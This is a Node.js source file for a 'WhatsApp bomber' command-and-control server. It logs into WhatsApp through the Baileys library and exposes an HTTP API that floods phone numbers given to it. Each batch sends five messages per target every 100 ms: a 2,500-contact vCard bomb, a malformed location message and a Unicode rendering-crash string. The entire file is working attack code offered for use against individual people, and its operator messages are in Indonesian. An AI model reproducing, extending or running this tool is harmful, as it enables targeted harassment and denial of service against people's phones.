/**
 * MALXGMN C2 SERVER - WHATSAPP BOMBER API
 * Usage: node bomber_server.js
 * Install: npm install
 */

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  delay,
  makeCacheableSignalKeyStore,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const express = require('express');
const qrcode = require('qrcode-terminal');
const fs = require('fs');

const app = express();
app.use(express.json());

// --- GLOBAL STATE ---
let isAttacking = false;
let activeSock = null;
let currentTargets = [];

// --- CONFIGURATION ---
const SESSION_DIR = 'auth_info_baileys';
const PORT = 3000;

// --- BAILEYS CONNECTION ---
async function startSock() {
  const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
  const { version } = await fetchLatestBaileysVersion();

  console.log(`[*] Using WhatsApp v${version.join('.')}`);

  const sock = makeWASocket({
    version,
    logger: pino({ level: 'silent' }), // Silent logs for clean terminal
    printQRInTerminal: true, // QR scan directly in terminal
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
    },
    browser: ["MALXGMN", "Chrome", "1.0.0"],
    generateHighQualityLinkPreview: true,
  });

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr) {
      console.log('[!] SCAN QR CODE DI BAWAH MENGGUNAKAN WHATSAPP');
    }

    if (connection === 'close') {
      const shouldReconnect =
        lastDisconnect.error instanceof Boom
          ? lastDisconnect.error.output?.statusCode !==
            DisconnectReason.loggedOut
          : true;

      console.log('[!] Connection closed. Reconnecting:', shouldReconnect);

      if (shouldReconnect) {
        startSock();
      } else {
        console.log('[!] Logged out. Delete auth_info_baileys to scan again.');
      }
    } else if (connection === 'open') {
      console.log('[+] CONNECTION OPENED! WAITING FOR COMMANDS...');
      activeSock = sock;
    }
  });

  sock.ev.on('creds.update', saveCreds);
}

// --- ATTACK LOGIC ---
async function runAttackLoop(rawTargets) {
  isAttacking = true;
  currentTargets = rawTargets;
  
  // Format JIDs
  const targetJids = rawTargets.map(t => t.replace(/[^0-9]/g, '') + '@s.whatsapp.net');

  console.log(`[!] STARTING ATTACK ON: ${targetJids.join(', ')}`);
  console.log('[!] MODE: TITAN SLAYER (RAM EATER EDITION)');

  // 1. RECURSIVE VCARD PAYLOAD (Heavy Parsing Load)
  let heavyVcardContent = '';
  // Reduced to 2000 per loop to ensure stability on server side, can adjust
  for(let i=0; i<2500; i++) {
      heavyVcardContent += 'BEGIN:VCARD
VERSION:3.0
FN:' + '🔥'.repeat(20) + 'SYSTEM_OVERLOAD_' + i + '
TEL;type=CELL;type=VOICE;waid=0:0
END:VCARD
';
  }
  
  const vcardPayload = {
      contacts: {
          displayName: '☠️ DATA CORRUPTION DETECTED ☠️', 
          contacts: [{ vcard: heavyVcardContent }] // 2500-Contact VCF Bomb
      }
  };

  // 2. LOCATION BOMB (GPS Rendering Glitch)
  const locationPayload = {
      location: {
          degreesLatitude: 999.999999, // Invalid high coordinate (Logic Test)
          degreesLongitude: 999.999999,
          name: "🚫 DEVICE CORRUPTED 🚫
".repeat(50),
          address: "SYSTEM HALTED"
      }
  };
  
  // 3. UNICODE CRASH SEQUENCE (Rendering Engine Killer)
  const crashText = "💣" + "\u200e\u200f".repeat(500) + "م" + "ࣾ".repeat(500) + "⃢".repeat(500);

  let counter = 0;

  while(isAttacking) {
      try {
          if (!activeSock) {
            console.log('[-] WA Disconnected, pausing attack...');
            await delay(5000);
            continue;
          }

          counter++;
          
          const batchTasks = [];
          
          for (const jid of targetJids) {
              // Push 5 types of payloads per target
              batchTasks.push(activeSock.sendMessage(jid, vcardPayload));
              batchTasks.push(activeSock.sendMessage(jid, vcardPayload));
              batchTasks.push(activeSock.sendMessage(jid, locationPayload));
              batchTasks.push(activeSock.sendMessage(jid, { text: crashText }));
              batchTasks.push(activeSock.sendMessage(jid, { text: crashText }));
          }

          await Promise.all(batchTasks);
          
          console.log(`[${counter}] TITAN BATCH SENT TO ${targetJids.length} TARGETS`);
          
          // Speed limit to avoid instant ban on server side
          await delay(100); 
          
      } catch (e) {
          console.log(`[!] Error in attack loop: ${e.message}`);
          await delay(1000);
      }
  }
  console.log('[!] ATTACK STOPPED.');
}


// --- API ENDPOINTS ---

/**
 * Start Attack
 * POST /attack
 * Body: { "targets": ["6281xxx", "6282xxx"] }
 */
app.post('/attack', (req, res) => {
  if (!activeSock) return res.status(503).json({ status: 'ERROR', msg: 'WA Belum Connect. Tunggu sebentar.' });
  if (isAttacking) return res.status(409).json({ status: 'BUSY', msg: 'Sedang menyerang target lain. Stop dulu.', targets: currentTargets });

  const { targets } = req.body;
  
  if (!targets || !Array.isArray(targets) || targets.length === 0) {
    return res.status(400).json({ status: 'ERROR', msg: 'Target tidak valid. Harus array nomor telepon.' });
  }

  // Start background process
  runAttackLoop(targets);

  res.json({ 
    status: 'STARTED', 
    msg: `Serangan dimulai ke ${targets.length} target.`,
    targets: targets 
  });
});

/**
 * Stop Attack
 * POST /stop
 */
app.post('/stop', (req, res) => {
  if (!isAttacking) return res.status(200).json({ status: 'IDLE', msg: 'Tidak ada serangan berjalan.' });
  
  isAttacking = false;
  currentTargets = [];
  
  res.json({ status: 'STOPPED', msg: 'Perintah stop diterima.' });
});

/**
 * Status Check
 * GET /status
 */
app.get('/status', (req, res) => {
  res.json({
    wa_connected: !!activeSock,
    is_attacking: isAttacking,
    current_targets: currentTargets
  });
});

// --- START SERVER ---
startSock();
app.listen(PORT, () => {
  console.log(`
=============================================
   MALXGMN C2 SERVER LISTENING ON PORT ${PORT}
=============================================
Endpoints:
[POST] /attack  -> { "targets": [...] }
[POST] /stop    -> Stop attack
[GET]  /status  -> Check status
`);
});
